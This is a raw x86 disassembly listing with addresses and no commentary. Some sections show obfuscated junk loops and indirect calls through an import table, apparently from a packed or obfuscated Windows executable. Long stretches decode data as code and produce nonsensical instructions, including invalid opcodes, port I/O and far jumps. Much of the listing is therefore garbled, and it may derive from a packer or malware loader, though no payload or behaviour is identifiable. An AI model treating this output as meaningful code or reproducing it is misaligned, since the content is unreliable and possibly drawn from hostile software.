  40a03e:	mov    DWORD PTR [ecx],eax
  40a040:	jmp    0x40a04c
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a785,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a785
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a785,eax
  40a084:	cmp    DWORD PTR ds:0x42a785,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a785,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a891,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a891
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a891,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a891,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42a891,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a7ad
  40a106:	mov    eax,ds:0x42a889
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a875
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a8b1
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a781,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a781
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a781,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a781,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a781,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a781,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a781
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a781,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7dd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0xe560,0xe9
  40a1b4:	std    
  40a1b5:	sub    al,0xe2
  40a1b7:	stc    
  40a1b8:	js     0x40a232
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	jns    0x40a1f5
  40a1c0:	mov    bh,0xa7
  40a1c2:	and    BYTE PTR [eax],dh
  40a1c4:	daa    
  40a1c5:	adc    edx,DWORD PTR ss:[edx]
  40a1c8:	xchg   BYTE PTR ds:0xb3c25a6e,cl
  40a1ce:	dec    ebx
  40a1cf:	out    dx,eax
  40a1d0:	aam    0x5b
  40a1d2:	jo     0x40a238
  40a1d4:	hlt    
  40a1d5:	stos   DWORD PTR es:[edi],eax
  40a1d6:	mov    BYTE PTR [eax],0x94
  40a1d9:	inc    edi
  40a1da:	dec    esi
  40a1db:	xor    eax,0xb13633a9
  40a1e0:	mov    eax,ds:0xbfe8853c
  40a1e5:	and    bh,ah
  40a1e7:	jb     0x40a23c
  40a1e9:	gs shl dh,cl
  40a1ec:	out    0x46,eax
  40a1ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1ef:	push   ss
  40a1f0:	xchg   edi,eax
  40a1f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1f2:	stos   BYTE PTR es:[edi],al
  40a1f3:	pop    ebp
  40a1f4:	jne    0x40a261
  40a1f6:	aas    
  40a1f7:	call   DWORD PTR [esp+ebp*2]
  40a1fa:	adc    ah,BYTE PTR [eax+0x1c76397b]
  40a200:	fsub   QWORD PTR [ecx+0x4b9089b5]
  40a206:	mov    edx,0xb7ff7fca
  40a20b:	out    dx,al
  40a20c:	das    
  40a20d:	fcomp  QWORD PTR ds:0x4244aafd
  40a213:	aad    0x86
  40a215:	scas   eax,DWORD PTR es:[edi]
  40a216:	test   al,0xb6
  40a218:	into   
  40a219:	and    al,0xb7
  40a21b:	add    cl,ch
  40a21d:	pusha  
  40a21e:	jge    0x40a263
  40a220:	es repz xchg edi,eax
  40a223:	pop    esp
  40a224:	cdq    
  40a225:	jb     0x40a299
  40a227:	shr    BYTE PTR [edi+0x53],cl
  40a22a:	xchg   edi,eax
  40a22b:	loope  0x40a2a4
  40a22d:	push   eax
  40a22e:	fs dec edi
  40a230:	jle    0x40a21f
  40a232:	mov    ebp,0xef64715
  40a237:	mov    ss,WORD PTR [edx+0x3b]
  40a23a:	jno    0x40a2a8
  40a23c:	pop    ebx
  40a23d:	cwde   
  40a23e:	stos   DWORD PTR es:[edi],eax
  40a23f:	sbb    bl,BYTE PTR [edi]
  40a241:	or     dh,BYTE PTR [ebx-0x77]
  40a244:	cli    
  40a245:	(bad)  
  40a247:	ret    
  40a248:	adc    BYTE PTR [eax],ah
  40a24a:	sbb    edi,DWORD PTR [edx+0x2bb85551]
  40a250:	icebp  
  40a251:	push   es
  40a252:	loop   0x40a210
  40a254:	xchg   esp,eax
  40a255:	push   0xa686b1d6
  40a25a:	inc    esp
  40a25b:	in     al,0x6
  40a25d:	pop    eax
  40a25e:	or     dh,BYTE PTR [ebx+0x5314f8c4]
  40a264:	xor    eax,0xff22a911
  40a269:	inc    esi
  40a26a:	mov    ah,0x65
  40a26c:	mov    edi,0xec2bde0a
  40a271:	ret    
  40a272:	sub    eax,0x5a7f408c
  40a277:	xchg   ebx,eax
  40a278:	mov    ds:0x68635374,eax
  40a27d:	iret   
  40a27e:	jne    0x40a21f
  40a280:	imul   ebx,DWORD PTR [ebp-0x1ef86612],0xd292369a
  40a28a:	mov    bh,BYTE PTR [edi-0x58]
  40a28d:	lods   eax,DWORD PTR ds:[esi]
  40a28e:	inc    ax
  40a290:	push   dx
  40a292:	popa   
  40a293:	test   eax,0x26b98213
  40a298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a299:	xchg   bl,bh
  40a29b:	aad    0x2a
  40a29d:	popf   
  40a29e:	dec    ebp
  40a29f:	outs   dx,DWORD PTR ds:[esi]
  40a2a0:	mov    bl,0x9b
  40a2a2:	cmp    ebp,DWORD PTR ds:[ecx-0x3f0f06bf]
  40a2a9:	mov    al,ds:0x187af11b
  40a2ae:	std    
  40a2af:	into   
  40a2b0:	pusha  
  40a2b1:	je     0x40a259
  40a2b3:	sub    cl,bh
  40a2b5:	je     0x40a241
  40a2b7:	sub    al,0x1b
  40a2b9:	test   eax,0x410368b9
  40a2be:	aam    0xda
  40a2c0:	shl    edi,0x48
  40a2c3:	pop    edx
  40a2c4:	pop    es
  40a2c5:	ret    
  40a2c6:	jle    0x40a25d
  40a2c8:	dec    eax
  40a2c9:	xor    DWORD PTR [edx],ecx
  40a2cb:	lds    ecx,FWORD PTR ds:0x8380598b
  40a2d1:	rcl    BYTE PTR [edi-0x41d417f3],0x4
  40a2d8:	push   esi
  40a2d9:	int    0x7d
  40a2db:	pop    ss
  40a2dc:	mov    cl,0xfc
  40a2de:	sahf   
  40a2df:	sub    ah,BYTE PTR [edx+ebp*2-0x4f]
  40a2e3:	xchg   BYTE PTR [eax+0x745c9ed4],cl
  40a2e9:	or     cl,BYTE PTR [eax+0xd]
  40a2ec:	xor    eax,0x90acfd70
  40a2f1:	jns    0x40a2b4
  40a2f3:	dec    esp
  40a2f4:	and    esi,DWORD PTR [eax]
  40a2f6:	pop    es
  40a2f7:	test   edx,ecx
  40a2f9:	and    ch,BYTE PTR [edx+ecx*4]
  40a2fc:	push   ebp
  40a2fd:	cli    
  40a2fe:	repnz test eax,0x3f9260fd
  40a304:	loope  0x40a32d
  40a306:	int3   
  40a307:	daa    
  40a308:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a309:	jnp    0x40a297
  40a30b:	mov    ebp,0x4bdee4ef
  40a310:	sbb    al,0x72
  40a312:	mov    ebp,0xe62b110c
  40a317:	mov    ebx,0xb60eedd4
  40a31c:	inc    ebx
  40a31d:	inc    esp
  40a31e:	jmp    0x217c:0x6941a576
  40a325:	es jae 0x40a333
  40a328:	add    ebp,DWORD PTR [edi]
  40a32a:	inc    esp
  40a32b:	aas    
  40a32c:	and    DWORD PTR [eax-0x57df4fd6],0x65
  40a333:	(bad)  
  40a334:	lea    ebx,[ebx+edx*2+0x1b]
  40a338:	scas   eax,DWORD PTR es:[edi]
  40a339:	mov    bl,0xd8
  40a33b:	sbb    dh,BYTE PTR [ebx]
  40a33d:	cs and eax,0x67af73ce
  40a343:	loope  0x40a31d
  40a345:	dec    esi
  40a346:	ja     0x40a2e0
  40a348:	rcr    DWORD PTR [edx+0x6c9d6dca],1
  40a34e:	or     esp,eax
  40a350:	xor    DWORD PTR [esi+ebx*1],esp
  40a353:	xor    dh,ch
  40a355:	adc    edi,ecx
  40a357:	cmp    edx,DWORD PTR [eax]
  40a359:	mov    edx,0x2b2ce36b
  40a35e:	icebp  
  40a35f:	lods   al,BYTE PTR ds:[esi]
  40a360:	gs ds xchg ecx,eax
  40a363:	mov    al,ch
  40a365:	xchg   ebp,eax
  40a366:	cmp    BYTE PTR [eax],al
  40a368:	lods   eax,DWORD PTR ds:[esi]
  40a369:	cmp    esi,DWORD PTR [edi+eax*4+0x5b]
  40a36d:	aaa    
  40a36e:	imul   ecx,DWORD PTR ds:0xcfe28d34,0xd35ad129
  40a378:	ret    0xe0c
  40a37b:	sub    bh,BYTE PTR [eax-0x51604da9]
  40a381:	ss cld 
  40a383:	into   
  40a384:	and    eax,0x57039e88
  40a389:	iret   
  40a38a:	imul   ebx,DWORD PTR [esi+0x22],0x75
  40a38e:	add    esi,DWORD PTR [ecx]
  40a390:	dec    eax
  40a391:	(bad)  
  40a392:	in     al,dx
  40a393:	jmp    0x4525:0x66d76658
  40a39a:	push   ss
  40a39b:	pop    esp
  40a39c:	ins    BYTE PTR es:[edi],dx
  40a39d:	add    al,0xf5
  40a39f:	xchg   edi,eax
  40a3a0:	sbb    esp,DWORD PTR [edi*4+0x25ec0d9c]
  40a3a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3a8:	leave  
  40a3a9:	push   0x9eb231b4
  40a3ae:	cld    
  40a3af:	inc    esp
  40a3b0:	dec    esp
  40a3b1:	and    BYTE PTR [ecx],ch
  40a3b3:	cmc    
  40a3b4:	adc    ebp,ebp
  40a3b6:	cmp    BYTE PTR [ebx-0x7a],0x49
  40a3ba:	cmp    edi,ebx
  40a3bc:	push   cs
  40a3bd:	xor    al,0xd0
  40a3bf:	int3   
  40a3c0:	fmul   DWORD PTR [ebp+0x4e7ea771]
  40a3c6:	repnz fild WORD PTR [edi]
  40a3c9:	aam    0xb6
  40a3cb:	mov    cl,0xd9
  40a3cd:	pop    eax
  40a3ce:	dec    eax
  40a3cf:	ja     0x40a3c6
  40a3d1:	cmp    eax,DWORD PTR [edi-0x599a272d]
  40a3d7:	int    0xcd
  40a3d9:	std    
  40a3da:	iret   
  40a3db:	lods   eax,DWORD PTR ds:[esi]
  40a3dc:	add    eax,0x9b7e1a94
  40a3e1:	cmp    edx,0x53
  40a3e4:	mov    edx,0xf8e64d1b
  40a3e9:	repz mov es,WORD PTR [ebp+eax*2-0x7f]
  40a3ee:	sub    eax,0xaa3bc8e5
  40a3f3:	pusha  
  40a3f4:	std    
  40a3f5:	clc    
  40a3f6:	mov    ebx,0xb83baba1
  40a3fb:	daa    
  40a3fc:	push   ds
  40a3fd:	aam    0xbe
  40a3ff:	mov    ds:0x6e81236e,al
  40a404:	fldcw  WORD PTR [esi+0x8]
  40a407:	pushf  
  40a408:	pusha  
  40a409:	cmp    BYTE PTR [ecx],ah
  40a40b:	xor    eax,0xe179e26a
  40a410:	imul   ebp,DWORD PTR [eax],0x947be467
  40a416:	iret   
  40a417:	sbb    bh,BYTE PTR [esi]
  40a419:	mov    WORD PTR [ecx-0x6e],ss
  40a41c:	jle    0x40a3cc
  40a41e:	jl     0x40a435
  40a420:	int3   
  40a421:	mov    ds:0x654f7b84,eax
  40a426:	les    esi,FWORD PTR [ebp+0x6309ed51]
  40a42c:	out    dx,al
  40a42d:	enter  0x66ed,0xa5
  40a431:	and    eax,DWORD PTR [esi-0x53b841c7]
  40a437:	mov    ds:0xc776f82c,eax
  40a43c:	xlat   BYTE PTR ds:[ebx]
  40a43d:	and    eax,0xd923c5b4
  40a442:	nop
  40a443:	sub    al,0xdc
  40a445:	mov    ebx,0x47af67c5
  40a44a:	or     eax,0xffffffe8
  40a44d:	adc    al,BYTE PTR [ebp-0x24]
  40a450:	mov    bl,0xb1
  40a452:	xchg   ebp,eax
  40a453:	ret    
  40a454:	pop    ebp
  40a455:	push   esp
  40a456:	out    dx,eax
  40a457:	dec    edx
  40a458:	add    DWORD PTR [edx+ebx*8+0x11],ecx
  40a45c:	cli    
  40a45d:	mov    eax,0x47059682
  40a462:	out    dx,eax
  40a463:	clc    
  40a464:	xor    al,0xc9
  40a466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a467:	pop    es
  40a468:	push   ebx
  40a469:	mov    BYTE PTR [edx],dl
  40a46b:	nop
  40a46c:	fcmovnu st,st(7)
  40a46e:	(bad)  
  40a46f:	loope  0x40a483
  40a471:	mov    ebx,0x52135f0
  40a476:	sbb    cl,ch
  40a478:	push   esi
  40a479:	pop    eax
  40a47a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a47b:	xchg   ebp,eax
  40a47c:	xchg   esi,eax
  40a47d:	sbb    edx,ebx
  40a47f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a480:	into   
  40a481:	retf   0x82c1
  40a484:	xor    eax,0x55fe4eda
  40a489:	dec    eax
  40a48a:	inc    ebx
  40a48b:	leave  
  40a48c:	push   0x505e9fe1
  40a491:	dec    esi
  40a492:	inc    esp
  40a493:	repnz cld 
  40a495:	out    0x5d,al
  40a497:	jecxz  0x40a4a0
  40a499:	test   al,0x34
  40a49b:	and    ebx,DWORD PTR [edi+0x22]
  40a49e:	ret    0x2dd
  40a4a1:	in     al,0xbf
  40a4a3:	xor    DWORD PTR [esi+0xd],ecx
  40a4a6:	jbe    0x40a47a
  40a4a8:	push   esp
  40a4a9:	and    edi,DWORD PTR [esi+0x53d4b1a2]
  40a4af:	lods   eax,DWORD PTR ds:[esi]
  40a4b0:	and    BYTE PTR ds:0xb34d4b25,al
  40a4b6:	mov    ds,WORD PTR [eax+0x458d3656]
  40a4bc:	fadd   QWORD PTR [ecx+0x42a7ed25]
  40a4c2:	add    BYTE PTR ds:0x890042a8,dl
  40a4c8:	inc    ebp
  40a4c9:	fadd   DWORD PTR [ecx+0x42a8a92d]
  40a4cf:	add    al,dl
  40a4d1:	xor    BYTE PTR [eax],al
  40a4d3:	add    BYTE PTR [ebx-0x367ef7bb],cl
  40a4d9:	mov    al,ds:0x8900003b
  40a4de:	inc    ebp
  40a4df:	loopne 0x40a462
  40a4e1:	and    eax,0x42a791
  40a4e6:	add    BYTE PTR [eax],al
  40a4e8:	add    BYTE PTR [eax],al
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a791
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a791,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a791,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a791,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a791
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a791,ecx
  40a527:	cmp    DWORD PTR ds:0x42a791,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a7bd
  40a53e:	mov    ecx,DWORD PTR ds:0x42a871
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a8a1,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a8a1
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a8a1,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a8a1,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a8a1,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a869,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a869
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a869,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a869,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa82
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a869,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a869
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a869,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a869,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2+0x7c],dh
  40a61b:	mov    ds:0xfede5b91,eax
  40a620:	js     0x40a69a
  40a622:	je     0x40a6a2
  40a624:	js     0x40a69e
  40a626:	fbld   TBYTE PTR gs:[edi+0x77]
  40a62a:	addr16 jge 0x40a5dd
  40a62d:	ja     0x40a627
  40a62f:	mov    dl,0x57
  40a631:	push   es
  40a632:	(bad)  
  40a633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a634:	int    0xf1
  40a636:	ja     0x40a674
  40a638:	in     al,dx
  40a639:	ret    0xfc0c
  40a63c:	cdq    
  40a63d:	(bad)  [esp+esi*1]
  40a640:	xor    edi,DWORD PTR [ecx]
  40a642:	pop    esp
  40a643:	mov    BYTE PTR [esi-0x26353023],ah
  40a649:	dec    ebx
  40a64a:	stos   BYTE PTR es:[edi],al
  40a64b:	push   es
  40a64c:	inc    edi
  40a64d:	push   ds
  40a64e:	leave  
  40a64f:	scas   al,BYTE PTR es:[edi]
  40a650:	push   esi
  40a651:	pusha  
  40a652:	or     bh,dl
  40a654:	add    DWORD PTR [edx-0x1b5ba6c6],ebx
  40a65a:	xchg   edx,eax
  40a65b:	inc    ebp
  40a65c:	iret   
  40a65d:	shl    BYTE PTR [ecx-0x4886bc9e],0xe2
  40a664:	or     eax,0x389e6c1e
  40a669:	cmp    al,0xb4
  40a66b:	ret    0x5333
  40a66e:	(bad)  [edi-0x49cb9c86]
  40a674:	ja     0x40a653
  40a676:	push   ecx
  40a677:	and    ebx,DWORD PTR [eax]
  40a679:	jge    0x40a680
  40a67b:	and    eax,0xc8373c3b
  40a680:	push   ds
  40a681:	rol    bh,cl
  40a683:	mov    ch,0x1
  40a685:	mov    ch,0xdd
  40a687:	sti    
  40a688:	cmp    BYTE PTR [ebx-0x3],ch
  40a68b:	jmp    0x2a20:0xa31a0f62
  40a692:	rcl    ecx,1
  40a694:	or     al,0x9
  40a696:	cli    
  40a697:	inc    bh
  40a699:	out    0x99,al
  40a69b:	add    al,0xbe
  40a69d:	in     eax,0x6f
  40a69f:	out    0x81,al
  40a6a1:	fcomp  DWORD PTR [ecx+0x70b6f506]
  40a6a7:	fistp  WORD PTR [esi+0x65]
  40a6aa:	mov    dl,0xd6
  40a6ac:	repz fisttp DWORD PTR [ebx]
  40a6af:	or     ebx,DWORD PTR [edx]
  40a6b1:	int3   
  40a6b2:	mov    edi,0x3366cfa6
  40a6b7:	retf   
  40a6b8:	imul   DWORD PTR [eax+0x25]
  40a6bb:	fnstcw WORD PTR [ebx+0x4b]
  40a6be:	cs call 0x67e32a21
  40a6c4:	inc    eax
  40a6c5:	sbb    DWORD PTR [eax-0x6f],esi
  40a6c8:	xchg   BYTE PTR [ecx-0x12846423],ah
  40a6ce:	jecxz  0x40a737
  40a6d0:	pop    ebx
  40a6d1:	popa   
  40a6d2:	xor    DWORD PTR [eax+eax*8+0x32],esp
  40a6d6:	lea    ecx,[edi+0x2643c2e7]
  40a6dc:	mov    ds:0xe52f4a56,eax
  40a6e1:	nop
  40a6e2:	push   0xd507e23c
  40a6e7:	into   
  40a6e8:	sbb    edx,DWORD PTR [edi+0x14]
  40a6eb:	cwde   
  40a6ec:	jb     0x40a704
  40a6ee:	sti    
  40a6ef:	push   0xbe716533
  40a6f4:	pop    ds
  40a6f5:	push   ecx
  40a6f6:	sti    
  40a6f7:	ins    DWORD PTR es:[edi],dx
  40a6f8:	mov    cl,0xe6
  40a6fa:	ror    dl,0xcd
  40a6fd:	or     ebp,DWORD PTR [edi+0x41]
  40a700:	lods   al,BYTE PTR ds:[esi]
  40a701:	dec    esi
  40a702:	(bad)  
  40a703:	loope  0x40a70b
  40a705:	ins    DWORD PTR es:[edi],dx
  40a706:	push   edi
  40a707:	mov    ecx,eax
  40a709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a70a:	ins    BYTE PTR es:[edi],dx
  40a70b:	ins    BYTE PTR es:[edi],dx
  40a70c:	cmp    eax,DWORD PTR [edi-0x7301e614]
  40a712:	add    bh,bh
  40a714:	addr16 stc 
  40a716:	jle    0x40a714
  40a718:	shl    DWORD PTR [esi-0x13124b7b],1
  40a71e:	fdivr  st(6),st
  40a720:	mov    dh,BYTE PTR [ecx+0x33]
  40a723:	push   0xc10a6fcf
  40a728:	add    DWORD PTR [ebx+0x21],edi
  40a72b:	xor    dl,BYTE PTR [edi-0x15610738]
  40a731:	loopne 0x40a75d
  40a733:	les    ecx,FWORD PTR [ebx]
  40a735:	or     ebp,eax
  40a737:	cmp    DWORD PTR [ebp-0x13470f4f],esi
  40a73d:	inc    edi
  40a73e:	and    DWORD PTR [edx-0x51c9860f],eax
  40a744:	cmc    
  40a745:	and    DWORD PTR [esi],edi
  40a747:	sub    eax,0xe2571e94
  40a74c:	(bad)  
  40a74d:	mov    eax,DWORD PTR [ecx+0x42fb27da]
  40a753:	cmp    al,0x83
  40a755:	rcl    DWORD PTR [ebx],cl
  40a757:	inc    edx
  40a758:	inc    esp
  40a759:	xchg   ebp,eax
  40a75a:	and    ebx,DWORD PTR [eax-0x4be5111c]
  40a760:	fs sbb al,0x95
  40a763:	xchg   DWORD PTR [ecx],edi
  40a765:	repnz fs sbb eax,0x896b7c6
  40a76c:	mov    dl,0x31
  40a76e:	jecxz  0x40a722
  40a770:	aam    0xfc
  40a772:	mul    BYTE PTR [ebx-0x9]
  40a775:	jmp    0x2dbf6a49
  40a77a:	fimul  WORD PTR [edx]
  40a77c:	push   cs
  40a77d:	cmp    BYTE PTR [edx-0x3],ch
  40a780:	sbb    dh,BYTE PTR ds:0x3e62f606
  40a786:	in     al,0x5b
  40a788:	adc    eax,DWORD PTR [edx+0x4c]
  40a78b:	aaa    
  40a78c:	xor    cl,0x89
  40a78f:	inc    ecx
  40a790:	pop    esi
  40a791:	(bad)  
  40a792:	ss adc dl,ah
  40a795:	add    edi,ebx
  40a797:	mul    BYTE PTR [ebx]
  40a799:	pop    esp
  40a79a:	shl    DWORD PTR [edi+eiz*2-0x7f5fcec8],cl
  40a7a1:	fldenv [ebp+0x1a44a851]
  40a7a7:	xchg   edx,eax
  40a7a8:	pop    ds
  40a7a9:	xor    bl,ch
  40a7ab:	fst    DWORD PTR [edx+0x7b5c8515]
  40a7b1:	dec    ebp
  40a7b2:	out    0x34,al
  40a7b4:	(bad)  
  40a7b5:	xlat   BYTE PTR ds:[ebx]
  40a7b6:	pop    ebp
  40a7b7:	retf   
  40a7b8:	sbb    DWORD PTR [esi+0x44994bc5],edi
  40a7be:	adc    dl,bl
  40a7c0:	sbb    DWORD PTR [ebx-0xa31152e],ecx
  40a7c6:	(bad)  
  40a7c7:	pushf  
  40a7c8:	cmp    al,0x87
  40a7ca:	add    al,0x2d
  40a7cc:	jno    0x40a843
  40a7ce:	hlt    
  40a7cf:	mov    ds:0x53f5d7e6,al
  40a7d4:	rcl    DWORD PTR [ebp-0x6f69d18d],1
  40a7da:	sahf   
  40a7db:	sub    eax,0x11f369fa
  40a7e0:	xchg   ebp,eax
  40a7e1:	or     BYTE PTR [ecx+0x53],dl
  40a7e4:	cli    
  40a7e5:	dec    edx
  40a7e6:	sub    edx,esi
  40a7e8:	imul   ecx,DWORD PTR [ecx],0xa69fcb50
  40a7ee:	repz leave 
  40a7f0:	xor    esp,DWORD PTR [esi+0x59b8f2e5]
  40a7f6:	mov    ch,0xbd
  40a7f8:	adc    edx,esi
  40a7fa:	outs   dx,BYTE PTR ds:[esi]
  40a7fb:	push   0xffffffa1
  40a7fd:	add    al,0x1
  40a7ff:	sub    eax,0xbc384b20
  40a804:	and    BYTE PTR [ecx+ebp*2],bl
  40a807:	test   eax,0x6d28a3ee
  40a80c:	mov    ecx,0x14e6c7fa
  40a811:	sti    
  40a812:	or     ah,BYTE PTR [edi]
  40a814:	mov    ds:0x58f8131f,eax
  40a819:	push   ebp
  40a81a:	imul   DWORD PTR [esi-0x7c037768]
  40a820:	mov    ch,0x9
  40a822:	pop    edx
  40a823:	pop    eax
  40a824:	stc    
  40a825:	aad    0x72
  40a827:	push   ebx
  40a828:	popf   
  40a829:	and    al,0x2b
  40a82b:	or     DWORD PTR [ebx+0x53],eax
  40a82e:	adc    eax,0x73a2fcd7
  40a833:	test   bh,bh
  40a835:	cmp    al,0x52
  40a837:	mov    edi,0x62780a4
  40a83c:	fwait
  40a83d:	stc    
  40a83e:	test   al,0xa5
  40a840:	push   ds
  40a841:	iret   
  40a842:	into   
  40a843:	inc    esi
  40a844:	xchg   ebx,eax
  40a845:	fnsave [eax-0x19e9cd1f]
  40a84b:	iret   
  40a84c:	fs pop ecx
  40a84e:	jl     0x40a847
  40a850:	push   esp
  40a851:	xchg   esp,eax
  40a852:	bound  edi,QWORD PTR [esi]
  40a854:	imul   esp,DWORD PTR [ebp-0x34e8fe12],0x2b
  40a85b:	das    
  40a85c:	ret    
  40a85d:	mov    dh,0xd9
  40a85f:	cs inc edx
  40a861:	into   
  40a862:	jbe    0x40a889
  40a864:	fcmovnbe st,st(4)
  40a866:	stc    
  40a867:	test   BYTE PTR [ecx],bh
  40a869:	nop
  40a86a:	int    0xe6
  40a86c:	jbe    0x40a88c
  40a86e:	inc    eax
  40a86f:	mov    ds:0x96f189d8,eax
  40a874:	cmc    
  40a875:	dec    edi
  40a876:	jae    0x40a818
  40a878:	arpl   WORD PTR [esi+0x4af52df4],sp
  40a87e:	out    0xf3,al
  40a880:	mov    edi,0xed2ab17c
  40a885:	dec    edi
  40a886:	hlt    
  40a887:	xchg   edi,eax
  40a888:	inc    esp
  40a889:	repz shr DWORD PTR [edi*2-0x48fb09f4],0xd7
  40a892:	inc    edx
  40a893:	xor    DWORD PTR ds:0x644ca203,esi
  40a899:	mov    edi,0xd50ab5bc
  40a89e:	xchg   esi,eax
  40a89f:	jmp    0x40a8f8
  40a8a1:	add    ah,ah
  40a8a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8a4:	mov    edi,0xa23b27f9
  40a8a9:	retf   
  40a8aa:	pop    es
  40a8ab:	in     al,dx
  40a8ac:	loop   0x40a8c7
  40a8ae:	test   DWORD PTR [ebp-0x13],edx
  40a8b1:	xchg   ebx,eax
  40a8b2:	mov    ah,0xb1
  40a8b4:	or     al,0xb8
  40a8b6:	mov    esp,DWORD PTR [edi+0x5]
  40a8b9:	lds    ebp,FWORD PTR ds:0xc6aa88d7
  40a8bf:	xor    eax,DWORD PTR [ebp+0x18]
  40a8c2:	lods   al,BYTE PTR ds:[esi]
